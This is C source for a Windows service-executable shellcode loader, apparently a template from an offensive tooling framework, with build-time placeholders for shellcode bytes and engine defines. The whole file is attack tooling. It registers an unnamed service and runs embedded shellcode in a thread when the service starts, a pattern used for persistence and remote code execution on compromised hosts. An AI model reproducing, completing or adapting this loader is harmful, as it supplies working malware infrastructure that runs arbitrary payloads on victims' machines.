%ENGINE_DEFINES%
#include "engine.h"

static unsigned char shellcode[] = { %SHELLCODE_BYTES% };
static unsigned int shellcode_len = %SHELLCODE_LEN%;

static SERVICE_STATUS svc_status;
static SERVICE_STATUS_HANDLE svc_status_handle;

static DWORD WINAPI shellcode_thread(LPVOID lpParam) {
    engine_run(shellcode, shellcode_len);
    return 0;
}

static void WINAPI svc_ctrl_handler(DWORD dwControl) {
    switch (dwControl) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            svc_status.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(svc_status_handle, &svc_status);
            break;
        default:
            break;
    }
}

static void WINAPI svc_main(DWORD dwArgc, LPTSTR *lpszArgv) {
    svc_status_handle = RegisterServiceCtrlHandler(TEXT(""), svc_ctrl_handler);
    if (!svc_status_handle) return;

    svc_status.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
    svc_status.dwCurrentState     = SERVICE_RUNNING;
    svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

    SetServiceStatus(svc_status_handle, &svc_status);

    HANDLE hThread = CreateThread(NULL, 0, shellcode_thread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    svc_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(svc_status_handle, &svc_status);
}

int main(void) {
    SERVICE_TABLE_ENTRY svc_table[] = {
        { TEXT(""), svc_main },
        { NULL, NULL },
    };

    StartServiceCtrlDispatcher(svc_table);

    return 0;
}
